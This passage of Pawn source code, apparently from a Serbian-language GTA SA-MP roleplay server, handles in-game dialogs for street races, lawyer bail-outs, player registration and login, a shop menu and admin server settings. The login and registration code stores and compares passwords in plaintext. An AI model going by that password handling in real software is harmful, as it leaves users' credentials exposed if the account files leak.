        format(string, 128, "Igrac %s vas je pozvao na ulicne trke! Ulog : %d", ImeIgraca(playerid), novac);
        ShowPlayerDialog(UlicneTrkeID[playerid], dialog_UlicneTrkePoziv, DIALOG_STYLE_MSGBOX, D_NASLOV, string, "Prihvati", "Odustani");
        return 1;
    }
    if(dialogid == dialog_UlicneTrkePoziv) {

        new id = UlicneTrkeID[playerid];

        if(!IsPlayerConnected(id)) {

            SendErrorMessage(playerid, "Igrac nije online!");
            UlicneTrkeUlog[playerid] = 0;
            UlicneTrkeID[playerid] = -1;
            return 1;
        }
        if(UlicneTrkeID[id] == -1) {

            SendErrorMessage(playerid, "Igrac je odustao od poziva!");
            UlicneTrkeUlog[playerid] = 0;
            UlicneTrkeID[playerid] = -1;
            return 1;
        }

        if(!response) {

            SendInfoMessage(playerid, "Odbio si poziv za ulicne trke!");
            SendInfoMessage(id, "Igrac je odbio vas poziv za ulicne trke!");
            UlicneTrkeID[playerid] = -1;
            UlicneTrkeID[id] = -1;
            UlicneTrkeUlog[playerid] = 0;
            UlicneTrkeUlog[id] = 0;
            return 1;
        }
        if(response) {

            //Pokrecemo trke
            if(StartnaLinijaUT == 1) {

                SendErrorMessage(playerid, "Startna linija je zauzeta! Sacekajte da igracima pocne trka!");
                UlicneTrkeUlog[playerid] = 0;
                UlicneTrkeUlog[id] = 0;
                UlicneTrkeID[id] = -1;
                UlicneTrkeID[playerid] = -1;
                return 1;
            }
            PocetakTrkaCount[playerid] = 15;
            PocetakTrkaCount[id] = 15;
            StartnaLinijaUT = 1;
            Novi_DisablePlayerCheckpoint(playerid);
            Novi_DisablePlayerCheckpoint(id);
            TogglePlayerControllable(playerid, 0);
            TogglePlayerControllable(id, 0);

            new vehid = UlicneTrkeRaceVeh[playerid];

            Novi_DestroyVehicle(UlicneTrkeVeh[playerid]);
            UlicneTrkeVeh[playerid] = V01D_CreateVehicle(vehid, 1824.4681,-1889.2273,13.0429,358.6184, 0, 0, -1 );
            Novi_PutPlayerInVehicle(playerid, UlicneTrkeVeh[playerid], 0);
            

            Novi_DestroyVehicle(UlicneTrkeVeh[id]);
            UlicneTrkeVeh[id] = V01D_CreateVehicle(vehid, 1819.9941,-1889.3579,13.1073,359.9996, 0, 0, -1 );
            Novi_PutPlayerInVehicle(id, UlicneTrkeVeh[id], 0);
            

            defer PocetakUlicnihTrka(playerid, id);

            return 1;
        }

    }
    if(dialogid == dialog_IzvuciZatvorenika) {

        if(!response) {

            new id = MojAdvokat[playerid];
            SendInfoMessage(playerid, "Odbio si izvlacenje advokata!");
            SendInfoMessage(id, "Igrac je odbio izvlacenje!");
            MojAdvokat[playerid] = -1;
            MojAdvokat[id] = -1;
            AdvokatPonuda[playerid] = 0;
            AdvokatPonuda[id] = 0;
            PozvaoAdvokata[playerid] = false;
            return 1;
        }
        if(response) {

            new id = MojAdvokat[playerid];
            if(GetPlayerMoney(playerid) < AdvokatPonuda[playerid]) {

                SendInfoMessage(playerid, "Nemas dovoljno novca!");
                SendInfoMessage(id, "Igrac nema dovoljno novca!");
                MojAdvokat[playerid] = -1;
                MojAdvokat[id] = -1;
                AdvokatPonuda[playerid] = 0;
                AdvokatPonuda[id] = 0;
                PozvaoAdvokata[playerid] = false;
                return 1;
            }
            Novi_SetPlayerPos( playerid, 1798.0217,-1578.1200,14.0855 );
            SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid, 0);
            SetPlayerWorldBounds( playerid, 20000.0000, -20000.0000, 20000.0000, -20000.0000 );
            SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
            SetCameraBehindPlayer( playerid );
            TogglePlayerControllable( playerid, false );
            SetPlayerInterior( playerid, 0);
            SetPlayerVirtualWorld( playerid, 1 );

            PlayerInfo[ playerid ][ xZatvor ] = 0;
            PlayerInfo[ playerid ][ xZatvorVreme ] = 0;
            GameTextForPlayer( playerid, "~g~Sloboda~n~~w~Pokusajte biti bolji gradjanin", 5000, 1);
            new plata = AdvokatPonuda[playerid]/2;
            SendInfoMessage(playerid, "Advokat vas je izvukao iz zatvora!");
            SendInfoMessage(id, "Izvukao si igraca iz zatvora i dobio %d$", plata);
            DajIgracuNovac(playerid, -AdvokatPonuda[playerid]);
            DajIgracuNovac(id, plata);
            MojAdvokat[playerid] = -1;
            MojAdvokat[id] = -1;
            AdvokatPonuda[playerid] = 0;
            AdvokatPonuda[id] = 0;
            PozvaoAdvokata[playerid] = false;
            return 1;
        }
    }
    if(dialogid == dialog_AdvokatPoziv) {

        if(!response) {

            new id = MojAdvokat[playerid];
            SendInfoMessage(playerid, "Odbio si advokatski poziv!");
            SendInfoMessage(id, "Advokat je odbio vas poziv!");
            PozvaoAdvokata[id] = false;
            MojAdvokat[id] = -1;
            MojAdvokat[playerid] = -1;
            return 1;
        }
        if(response) {

            new id = MojAdvokat[playerid];
            SendInfoMessage(playerid, "Prihvatio si advokatski poziv! Idi na lokaciju!");
            SendInfoMessage(id, "Advokat je prihvatio poziv! Pricekajte da dodje! /odbijpoziv");
            Novi_SetPlayerCheckpoint(playerid, 1798.0217,-1578.1200,14.0855, 2.0);
            return 1;
        }
        return 1;
    }
    if(dialogid == dialog_VipImovina) {

        if(!response) return 0;
        if(response) {

            new File[50];
            new id = strval(inputtext);
            format( File, sizeof( File ), IM_FILE, id );
            if( !fexist( File ) ) return SendErrorMessage( playerid, "Ta imovina(ID) ne postoji u bazi podataka!");
            Novi_SetPlayerPos( playerid, II[ id ][ iEnter ][ 0 ], II[ id ][ iEnter ][ 1 ], II[ id ][ iEnter ][ 2 ] );
            SetPlayerInterior( playerid,0 );
            SetPlayerVirtualWorld( playerid,0 );
            SendClientMessageEx( playerid, BELA, "Teleportovali ste se do kuce ID %d",id);
            return 1;
        }
    }
	////////////////////////////////////////////////////////////////////////////
	if( dialogid == dialog_LOGIN ) {
	    if( !response ) return Kick( playerid );
		if( response ) {
			if( !strcmp( inputtext, PlayerInfo[ playerid ][ xLozinka ], false ) && !isnull( inputtext ) ) {
				INI_ParseFile( Korisnici( playerid ), "OcitajKorisnika", .bExtra = true, .extra = playerid );

				if( PlayerInfo[ playerid ][ xAdmin ] > 0 ) INI_ParseFile( Admini( playerid ), "OcitajAdmina", .bExtra = true, .extra = playerid );
				INI_ParseFile( KladIme( playerid ), "LoadKladionica", .bExtra = true, .extra = playerid );
				//LoginTDControl( playerid, false );

                new datum[ 64 ]; new year, month,day;
				getdate( year, month, day );
		        new tmphour, tmpminute, tmpsecond;
				gettimeEx( tmphour, tmpminute, tmpsecond );
				FixHour( tmphour );
				tmphour = shifthour;
   				format( datum, sizeof( datum ), "%02d/%02d/%d - %d/%d/%d", day, month, year, tmphour, tmpminute, tmpsecond );
		        strmid( PlayerInfo[ playerid ][ xLastLogin ], datum, 0, strlen( datum ), 64 );
		        
		        if( PlayerInfo[ playerid ][ xFirmaID ] != -1 ) {
		        
					BussinesInfo[ PlayerInfo[ playerid ][ xFirmaID ] ][ bNeaktivnost ] = 0;
					SaveBussines( PlayerInfo[ playerid ][ xFirmaID ] );
				}
				
				if( PlayerInfo[ playerid ][ xProperty ][ 0 ] != -1 ) {

					II[ PlayerInfo[ playerid ][ xProperty ][ 0 ] ][ iNeaktivnost ] = 0;
					SaveProperty( PlayerInfo[ playerid ][ xProperty ][ 0 ] );
                    PropertyRefresh( PlayerInfo[ playerid ][ xProperty ][ 0 ] );
				}
				if( PlayerInfo[ playerid ][ xProperty ][ 1 ] != -1 ) {

					II[ PlayerInfo[ playerid ][ xProperty ][ 1 ] ][ iNeaktivnost ] = 0;
					SaveProperty( PlayerInfo[ playerid ][ xProperty ][ 1 ] );
                    PropertyRefresh( PlayerInfo[ playerid ][ xProperty ][ 1 ] );
				}
				if( PlayerInfo[ playerid ][ xProperty ][ 2 ] != -1 ) {
				
					II[ PlayerInfo[ playerid ][ xProperty ][ 2 ] ][ iNeaktivnost ] = 0;
					SaveProperty( PlayerInfo[ playerid ][ xProperty ][ 2 ] );
                    PropertyRefresh( PlayerInfo[ playerid ][ xProperty ][ 2 ] );
				}

                if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] != -1 ) {

					VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 0 ] ][ vNeaktivnost ] = 0;
					SaveVehicle( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] );
				}
	            if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] != -1 ) {

					VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 1 ] ][ vNeaktivnost ] = 0;
					SaveVehicle( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] );
				}
				if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] != -1 ) {

					VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 2 ] ][ vNeaktivnost ] = 0;
					SaveVehicle( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] );
				}
				if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] != -1 ) {

					VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 3 ] ][ vNeaktivnost ] = 0;
					SaveVehicle( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] );
				}

                new banfile[ 100 ]; format( banfile, sizeof( banfile ), FILE_BAN, ImeIgraca( playerid ) );
				if( fexist( banfile ) ) {
				    new File: UserFile = fopen( banfile, io_read );
				    new razlogbana[ 128 ] = "Nepoznat";
					new key[256];
					new Data[256];
					while ( fread( UserFile , Data, sizeof( Data ) ) ) {
						key = ini_GetKey( Data );
						if( strcmp( key , "Razlog" , true ) == 0 ) {
						    format( razlogbana, strlen( ini_GetValue ( Data ) ), "%s", ini_GetValue( Data ) );
						}
					}
					fclose( UserFile );
					getdate( year, month, day );

					SendClientMessage( playerid, SVETLOCRVENA, "| V:AC | Vas acc je trenutno iskljucen sa servera! Izbaceni ste!" );
			        format( globalstring, sizeof( globalstring ), "Razlog bana: %s", razlogbana );
			        SendClientMessage( playerid, BELA, globalstring );
			        format( globalstring, sizeof( globalstring ), "Vas server nick: %s, Danasnji datum: %d.%d.%d", ImeIgraca( playerid ), day, month, year );
			        SendClientMessage( playerid, ZUTA, globalstring );
			        Novi_Kick( playerid );
					return 1;
				}

			    if( PlayerInfo[ playerid ][ xPocetniTut ] == 0 ) {
			        TogglePlayerSpectating( playerid, true );
				    InterpolateCameraPos( playerid, 1677.1746, -1303.1085, 481.0584, 1452.0430, -1314.4868, 176.0983, 50000, CAMERA_MOVE);
					InterpolateCameraLookAt( playerid, 1676.1766, -1312.1057, 479.6893, 1451.0450, -1314.4979, 174.7492, 50000, CAMERA_MOVE);
					SetPlayerInterior( playerid, 0 );
					SetPlayerVirtualWorld( playerid, 1 );
					Novi_SetPlayerPos( playerid, 1463.7633,-1041.4501,26.8281);
					SendClientMessage( playerid, SIVA," ");
					SendClientMessage( playerid, SIVA," ");
					SendClientMessage( playerid, SIVA," ");
					SendClientMessage( playerid, SIVA," ");
					SendClientMessage( playerid, SIVA," ");
					SendClientMessage( playerid, SIVA," ");
					SendClientMessage( playerid, ZELENA, "~ DOBRO DOSLI NA Valhalla ~");
					SendClientMessage( playerid, SIVA," ");
				  	SendClientMessage( playerid, BELA, "Pre svega zelimo vam pozeleti dobrodoslicu na nas server.");
				    SendClientMessage( playerid, BELA, "Ovo je tutorijal u kojem cemo vam pokazati najvaznije lokacije na serveru.");
				    SendClientMessage( playerid, BELA, "Objasnit cemo vam kako uspesno zapoceti igru i uciniti je zanimljivom.");
				    SendClientMessage( playerid, BELA, "Verujem da znate da je ovo RP server i da je dosta tesko doci do novca.");
				    SendClientMessage( playerid, BELA, "Na pocetku imate 500$ kod sebe, koje ce vam pomoci.");
				    TimerTutorial[ playerid ] = SetTimerEx( "PocetniTut", 25000, false, "ii", playerid, 1 );
				    PocetniTutorialStartovan[ playerid ] = true;
			    }
			    else {
			    
			        aliasLogin( playerid );
			    
                    TogglePlayerSpectating( playerid, false );
					Novi_SetSpawnInfo( playerid );
    				SpawnPlayer( playerid ); PlayerLogged[ playerid ] = true;
    				antiCheatCS[ playerid ][ TeleportCheck ] = 4;
    				antiCheatCS[ playerid ][ WeaponDetect ] = 4;

                    for(new i=0; i<30; i++)
                    {
                        TextDrawShowForPlayer(playerid, InGame_TD[i]);
                    }
					happyHoursTDControl(ServerInfo[HappyHours]);
                    happyJobTDControl(ServerInfo[HappyJob]);
					
					if( PlayerInfo[ playerid ][ xPol ] == 0 ) PlayerInfo[ playerid ][ xPol ] = 1;
					
					SetPlayerVirtualWorld( playerid, 0 );
                    SetPlayerInterior(playerid, 0);
	 				
	 				DonatorBoja( playerid );
	 				
	 				ResetAllWeapons( playerid );
	 				
	 				new playersip[ 128 ];
        			GetPlayerIp( playerid, playersip, sizeof( playersip ) );
        			
	 				format( globalstring, sizeof( globalstring ), "Igrac: %s | [ID:%d] | [LVL:%d] se ulogovao na server.", ImeIgraca( playerid ), playerid, PlayerInfo[ playerid ][ xLevel ], playersip );
					AdminPoruka( ZUTA, globalstring );
				}
			}
			else {
			    if( PokusajLogina[ playerid ] == MAX_POKUSAJ_LOGINA - 1 ) {
					format( globalstring, sizeof( globalstring ), "Uneli ste krivu lozinku %d puta i dobili kick!", MAX_POKUSAJ_LOGINA );
				    SCM( playerid, CRVENA, globalstring);
				    Kick( playerid );
				    return true;
				}
		    	PokusajLogina[ playerid ]++;
				SendClientMessage( playerid, CRVENA, "Kriva lozinka!" );
				format( sDStrg, sizeof( sDStrg ), DialogTekstovi[ 0 ], MAX_POKUSAJ_LOGINA );
			    SPD( playerid, dialog_LOGIN, DSP, D_NASLOV, sDStrg, D_ODABERI, D_ODUSTANI );
			}
		}
		return true;
	}
	else if( dialogid == dialog_REGISTER ) {
		if( !response ) return 1;
		if( response ) {
			if( strlen( inputtext ) < 6 || strlen(inputtext) > 20 ) {
		    	SPD( playerid, dialog_REGISTER, DSI, "Registracija", "Password moze sadrzavati minimalno 6 a maximalno 24 znaka", "Registruj", "Izlaz");
				return 1;
			}
			else {
				strmid( PlayerInfo[ playerid ][ xLozinka ], inputtext, 0, strlen( inputtext ), 50);
		    	PlayerTextDrawSetString( playerid, RegisterTD[ playerid ][ 16 ], inputtext );
				InputPassword[ playerid ] = true;
				SelectTextDraw( playerid, 0x37672AFF );
	    	}
		}
	}
	else if( dialogid == dialog_Sex) {
		if(!response) {
			PlayerInfo[playerid][xPol] = 2;
			PlayerTextDrawSetString(playerid, RegisterTD[playerid][20], "ZENSKO");
			OdabraniSkin[playerid] = ZenskiSkinoviID[0][0];
			OdabraoSex[playerid] = true;
			SelectTextDraw(playerid, 0x37672AFF);
		}
		if(response) {
			PlayerInfo[playerid][xPol] = 1;
			PlayerTextDrawSetString(playerid, RegisterTD[playerid][20], "MUSKO");
			OdabraniSkin[playerid] = MuskiSkinoviID[0][0];
			OdabraoSex[playerid] = true;
			SelectTextDraw(playerid, 0x37672AFF);
		}
	}
    else if(dialogid == dialog_SKIN && response) {

        if(PlayerInfo[playerid][xPol] == 1) {

            OdabraoSkin[playerid] = true;
            OdabraniSkin[playerid] = MuskiSkinoviID[listitem][0];

            new skinIme[24];
            format(skinIme, sizeof(skinIme), "%s", MuskiSkinoviImena[listitem]);
            PlayerTextDrawSetString(playerid, RegisterTD[playerid][27], skinIme);

            SelectTextDraw(playerid, 0x37672AFF);

            return 1;
        }
        else {

            OdabraoSkin[playerid] = true;
            OdabraniSkin[playerid] = ZenskiSkinoviID[listitem][0];

            new skinIme[24];
            format(skinIme, sizeof(skinIme), "%s", ZenskiSkinoviImena[listitem][0]);
            PlayerTextDrawSetString(playerid, RegisterTD[playerid][27], skinIme);

            SelectTextDraw(playerid, 0x37672AFF);

            return 1;
        }
    }
	else if( dialogid == dialog_COUNTRY ) {
	    if( !response ) return 1;
		if( response ) {
		    switch( listitem ) {
			 	case 0: {
			 	    PlayerInfo[ playerid ][ xDrzava ] = 3;
				    PlayerTextDrawSetString( playerid, RegisterTD[ playerid ][ 21 ], "Srbija" );
				    ChoseCountry[ playerid ] = true;
				    SelectTextDraw( playerid, 0x37672AFF );
			 	}
			 	case 1: {
			 	    PlayerInfo[ playerid ][ xDrzava ] = 2;
				    PlayerTextDrawSetString( playerid, RegisterTD[ playerid ][ 21 ], "Hrvatska" );
				    ChoseCountry[ playerid ] = true;
				    SelectTextDraw( playerid, 0x37672AFF );
			 	}
			 	case 2: {
			 	    PlayerInfo[ playerid ][ xDrzava ] = 1;
				    PlayerTextDrawSetString( playerid, RegisterTD[ playerid ][ 21 ], "Makedonija" );
				    ChoseCountry[ playerid ] = true;
				    SelectTextDraw( playerid, 0x37672AFF );
			 	}
			 	case 3: {
			 	    PlayerInfo[ playerid ][ xDrzava ] = 4;
				    PlayerTextDrawSetString( playerid, RegisterTD[ playerid ][ 21 ], "Crna_Gora" );
				    ChoseCountry[ playerid ] = true;
				    SelectTextDraw( playerid, 0x37672AFF );
			 	}
			 	case 4: {
			 	    PlayerInfo[ playerid ][ xDrzava ] = 5;
				    PlayerTextDrawSetString( playerid, RegisterTD[ playerid ][ 21 ], "BiH" );
				    ChoseCountry[ playerid ] = true;
				    SelectTextDraw( playerid, 0x37672AFF );
			 	}
			 	case 5: {
			 	    PlayerInfo[ playerid ][ xDrzava ] = 6;
				    PlayerTextDrawSetString( playerid, RegisterTD[ playerid ][ 21 ], "Ostalo" );
				    ChoseCountry[ playerid ] = true;
				    SelectTextDraw( playerid, 0x37672AFF );
			 	}
			}
		}
	}
	else if( dialogid == dialog_AGE ) {
		if( !response ) return 1;
		if( response ) {
		    new age = strval( inputtext );
			if( age < 12 || age > 70 ) return SPD( playerid, dialog_AGE, DSI, "Godine", "U prazni prostor ispod unesite vaše godine\nMinimalno 12 maximalno 70", "Unos", "Izadji" );
            PlayerTextDrawSetString( playerid, RegisterTD[ playerid ][ 19 ], inputtext );
			PlayerInfo[ playerid ][ xGodine ] = age;
			InputAge[ playerid ] = true;
		    SelectTextDraw( playerid, 0x37672AFF );
		}
	}
	else if( dialogid == dialog_MAIL ) {
		if( !response ) return 1;
		if( response ) {
		    new mailstring = strfind( inputtext, "@", true), tackastring = strfind( inputtext, ".", true );
	        if( mailstring == -1 || tackastring == -1) {
        		SPD(playerid, dialog_MAIL, DSI, "Mail", "U prazni prostor ispod unesite vasu e-mail adresu.\nE-mail adresa ce nam posluziti u vracanju vasih passworda.(Bez maila nema vracanja passworda)", "Unos", "Izlaz");
			}
			else {
				strmid( PlayerInfo[ playerid ][ xEmail ], inputtext, 0, strlen( inputtext ), 34 );
				PlayerTextDrawSetString( playerid, RegisterTD[ playerid ][ 18 ], inputtext );
				InputMail[ playerid ] = true;
	         	SelectTextDraw( playerid, 0x37672AFF );
			}
		}
	}
	else if( dialogid == dialog_MARKETBUY ) {
	    if( !response ) return true;
    	if( response ) {
    	    
            if(listitem == 0) {

                if(!Inventory_HasSpace(playerid, inventoryPizzaID)) return SendErrorMessage(playerid, "Nemas mesta u rancu!");

                Inventory_Add(playerid, inventoryPizzaID, 1);

                DajIgracuNovac( playerid, -100 );
                BussinesInfo[ uFirmi[ playerid ] ][ bProducts ] -= 1;
                BussinesMoney( uFirmi[ playerid ], 80);

                format( globalstring, sizeof( globalstring ), "%s placa kasirki, te uzima nesto iz prodavnice.", ImeIgraca( playerid ) );
                PorukaRadius( 20.0 , playerid, globalstring, LJUBICASTA );
                SavePlayer( playerid );
                return 1;
            }
            if(listitem == 1) {

                DajIgracuNovac( playerid, -200 );
                Uze[ playerid ] = true;
                BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--; BussinesMoney( uFirmi[ playerid ], 120 );

                format( globalstring, sizeof( globalstring ), "%s placa kasirki, te uzima nesto iz prodavnice.", ImeIgraca( playerid ) );
                PorukaRadius( 20.0 , playerid, globalstring, LJUBICASTA );
                SavePlayer( playerid );
                return 1;
            }
            if(listitem == 2) {

                if(!Inventory_HasSpace(playerid, inventorySokID)) return SendErrorMessage(playerid, "Nemas mesta u rancu!");

                Inventory_Add(playerid, inventorySokID, 1);

                DajIgracuNovac( playerid, -40 );
                BussinesInfo[ uFirmi[ playerid ] ][ bProducts ] -= 1;
                BussinesMoney( uFirmi[ playerid ], 30);

                

                format( globalstring, sizeof( globalstring ), "%s placa kasirki, te uzima nesto iz prodavnice.", ImeIgraca( playerid ) );
                PorukaRadius( 20.0 , playerid, globalstring, LJUBICASTA );
                SavePlayer( playerid );
                return 1;
            }
            if(listitem == 3) {

                if(!Inventory_HasSpace(playerid, inventoryPivoID)) return SendErrorMessage(playerid, "Nemas mesta u rancu!");

                Inventory_Add(playerid, inventoryPivoID, 1);

                DajIgracuNovac( playerid, -55 );
                BussinesInfo[ uFirmi[ playerid ] ][ bProducts ] -= 1;
                BussinesMoney( uFirmi[ playerid ], 50);

                

                format( globalstring, sizeof( globalstring ), "%s placa kasirki, te uzima nesto iz prodavnice.", ImeIgraca( playerid ) );
                PorukaRadius( 20.0 , playerid, globalstring, LJUBICASTA );
                SavePlayer( playerid );
                return 1;
            }
            if(listitem == 4) {

                if(!Inventory_HasSpace(playerid, inventoryHamburgerID)) return SendErrorMessage(playerid, "Nemas mesta u rancu!");

                Inventory_Add(playerid, inventoryHamburgerID, 1);

                DajIgracuNovac( playerid, -60 );
                BussinesInfo[ uFirmi[ playerid ] ][ bProducts ] -= 1;
                BussinesMoney( uFirmi[ playerid ], 50);


                format( globalstring, sizeof( globalstring ), "%s placa kasirki, te uzima nesto iz prodavnice.", ImeIgraca( playerid ) );
                PorukaRadius( 20.0 , playerid, globalstring, LJUBICASTA );
                SavePlayer( playerid );
                return 1;
            }
            if(listitem == 5) {

                if(!Inventory_HasSpace(playerid, inventoryPiletinaID)) return SendErrorMessage(playerid, "Nemas mesta u rancu!");

                Inventory_Add(playerid, inventoryPiletinaID, 1);

                DajIgracuNovac( playerid, -250 );
                BussinesInfo[ uFirmi[ playerid ] ][ bProducts ] -= 1;
                BussinesMoney( uFirmi[ playerid ], 200);


                format( globalstring, sizeof( globalstring ), "%s placa kasirki, te uzima nesto iz prodavnice.", ImeIgraca( playerid ) );
                PorukaRadius( 20.0 , playerid, globalstring, LJUBICASTA );
                SavePlayer( playerid );
                return 1;
            }
            if(listitem == 6) {

                DajIgracuNovac( playerid, -35 );
                PlayerInfo[ playerid ][ xCigare ] += 20;
                BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--; BussinesMoney( uFirmi[ playerid ], 35);

                format( globalstring, sizeof( globalstring ), "%s placa kasirki, te uzima nesto iz prodavnice.", ImeIgraca( playerid ) );
                PorukaRadius( 20.0 , playerid, globalstring, LJUBICASTA );
                SavePlayer( playerid );
                return 1;
            }

            if(listitem == 7) {

                DajIgracuNovac( playerid, -25 );
                PlayerInfo[ playerid ][ xUpaljac ] = 1;
                BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--; BussinesMoney( uFirmi[ playerid ], 25);

                format( globalstring, sizeof( globalstring ), "%s placa kasirki, te uzima nesto iz prodavnice.", ImeIgraca( playerid ) );
                PorukaRadius( 20.0 , playerid, globalstring, LJUBICASTA );
                SavePlayer( playerid );
                return 1;
            }
            if(listitem == 8) {

                DajIgracuNovac( playerid, -80 );
                PlayerInfo[ playerid ][ xSodaB ] += 1;
                BussinesInfo[ uFirmi[ playerid ] ][ bProducts ] -= 1; BussinesMoney( uFirmi[ playerid ], 60);

                format( globalstring, sizeof( globalstring ), "%s placa kasirki, te uzima nesto iz prodavnice.", ImeIgraca( playerid ) );
                PorukaRadius( 20.0 , playerid, globalstring, LJUBICASTA );
                SavePlayer( playerid );
                return 1;
            }
            if(listitem == 9) {

                DajIgracuNovac( playerid, -40 );
                PlayerInfo[ playerid ][ xDesVoda ] += 1;
                BussinesInfo[ uFirmi[ playerid ] ][ bProducts ] -= 1; BussinesMoney( uFirmi[ playerid ], 35);

                format( globalstring, sizeof( globalstring ), "%s placa kasirki, te uzima nesto iz prodavnice.", ImeIgraca( playerid ) );
                PorukaRadius( 20.0 , playerid, globalstring, LJUBICASTA );
                SavePlayer( playerid );
                return 1;
            }
		}
	}
	else if( dialogid == dialog_SERVERMI ) {
	    if( !response ) return true;
        if( response ) {
        	if( listitem == 0 ) {
        	    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu sekciju.");
                //if( !IsPlayerAdmin( playerid ) ) return SendErrorMessage( playerid, "Moras biti rcon admin." );
                SPD( playerid, dialog_SERVERSTATS, DSL, D_NASLOV, "Informacije servera\nMogucnost kupovine vozila\nSrecni sati\nMogucnost slanja pitanja\nMogucnost slanja reporta\nPromeni pocetni level\nPromeni pocetni novac\nMogucnost postavljanja oglasa\nMogucnost registracije\nHappy Job\nSrecniID\nPromeni Hostname\nStavi sifru\nPlate Poslova", D_ODABERI, D_ODUSTANI );
            }
			if( listitem == 1 ) {
			    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu sekciju.");
                //if( !IsPlayerAdmin( playerid ) ) return SendErrorMessage( playerid, "Moras biti rcon admin." );
                foreach( Player, i ) {
					if( PlayerLogged[ i ] == true ) {
						SavePlayer( i );
					}
				}
				SCMA( SRVBOJA1, "Svi korisnicki nalozi su sacuvani." );
            }
			if( listitem == 2 ) {
			    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu sekciju.");
                //if( !IsPlayerAdmin( playerid ) ) return SendErrorMessage( playerid, "Moras biti rcon admin." );
				SPD( playerid, dialog_NAPRAVISVE, DSL, D_NASLOV, "Organizacije\nVozila\nFirmu\nKontejner\nKuca\nStan\nVikendica\nEvent\nBankomat\nAuto salon\nHotel\nKapija\nImanje\nGaraza\nGPS Lokacija\nRadar\nGang Zona\nRent Lokacija\nActor\nPlantaza Posao\nBitCoin WorkShop\nOrg Veh Pickup\nRadionica\nNargila\nPort\nKurva\nNaftna Platforma", D_ODABERI, D_NAZAD ); }
			if( listitem == 3 ) {
			    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu sekciju.");
                //if( !IsPlayerAdmin( playerid ) ) return SendErrorMessage( playerid, "Moras biti rcon admin." );
				SPD ( playerid, dialog_IZBRISISVE, DSL, D_NASLOV, "Organizacije\nFirme\nImovina\nKontejner\nVozilo\nBankomat\nAuto salon\nPort orge\nHotel\nKapija\nImanje\nGaraza\nRadar\nGang Zona\nRent Lokacija\nAktor\nPlantaza Posao\nBitCoin WorkShop\nOrg Veh Pickup\nRadionica\nNargila\nPort\nKurva\nNaftna Platforma", D_ODABERI, D_ODUSTANI ); }
			if( listitem == 4 ) {
       			if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu sekciju.");
                //if( !IsPlayerAdmin( playerid ) ) return SendErrorMessage( playerid, "Moras biti rcon admin." );
                SPD ( playerid, dialog_IZMENISVE, DSL, D_NASLOV, "Organizacije\nFirme\nVozilo\nImovina\nHotel\nImanje\nGaraza\nGPS Lokacija\nAdmin TEAM port\nSupport port\nAuto Salon\nGang Zona\nOrgVehPickup\nBitcoin WorkShop\nRadionica\nNaftna Platforma", D_ODABERI, D_ODUSTANI ); }
			if( listitem == 5 ) {
			    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
				for( new i = 1; i < MAX_ORG; i++)
				{
					new oFile[40];
					format(oFile, sizeof( oFile ), O_FILE, i);
					if(fexist(oFile))
					{
                        format( globalstring, sizeof( globalstring ), "ID : %d | Ime organizacije: %s\n", OI[ i ][ oID ], OI[ i ][ oName ] );
	                	strcat( DialogStrgEx, globalstring );
					}
				}
				ShowPlayerDialog( playerid, dialog_ORGLIST, DSMSG, D_NASLOV, DialogStrgEx, "U redu", "" );
				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
			}
			if( listitem == 6 ) {
        		strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
				format( globalstring, sizeof( globalstring ), "antiWeaponHack/%s/%s\n", getCheatPower( antiCheatSS[ antiWeaponH ] ), getCheatWork( antiCheatSS[ WeaponHRezimRada ] ) );
				strcat( DialogStrgEx, globalstring );
				format( globalstring, sizeof( globalstring ), "antiTeleportHack/%s/%s\n", getCheatPower( antiCheatSS[ antiTeleportH ] ), getCheatWork( antiCheatSS[ TeleportHRezimRada ] ) );
				strcat( DialogStrgEx, globalstring );
				format( globalstring, sizeof( globalstring ), "antiFlyHack/%s/%s\n", getCheatPower( antiCheatSS[ antiFlyH ] ), getCheatWork( antiCheatSS[ FlyHRezimRada ] ) );
				strcat( DialogStrgEx, globalstring );
				format( globalstring, sizeof( globalstring ), "antiVehRepHack/%s/%s\n", getCheatPower( antiCheatSS[ antiVehRepair ] ), getCheatWork( antiCheatSS[ VehRepRezimRada ] ) );
				strcat( DialogStrgEx, globalstring );
				format( globalstring, sizeof( globalstring ), "antiJetpackHack/%s/%s\n", getCheatPower( antiCheatSS[ antiJetPackH ] ), getCheatWork( antiCheatSS[ JetPackHRezimRada ] ) );
				strcat( DialogStrgEx, globalstring );
				format( globalstring, sizeof( globalstring ), "antiSpeedHack/%s/%s", getCheatPower( antiCheatSS[ antiSpeedH ] ), getCheatWork( antiCheatSS[ SpeedHRezimRada ] ) );
				strcat( DialogStrgEx, globalstring );
				ShowPlayerDialog( playerid, dialog_ANTICHEAT, DSL, "AntiCheat", DialogStrgEx, D_ODABERI, D_ODUSTANI );
				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
			}
		}
	}

	else if( dialogid == DIALOG_RENTUZMI ) 
	{
		if(!response) return 0;
		if(response)
		{
			switch(listitem)
			{
				case 0:
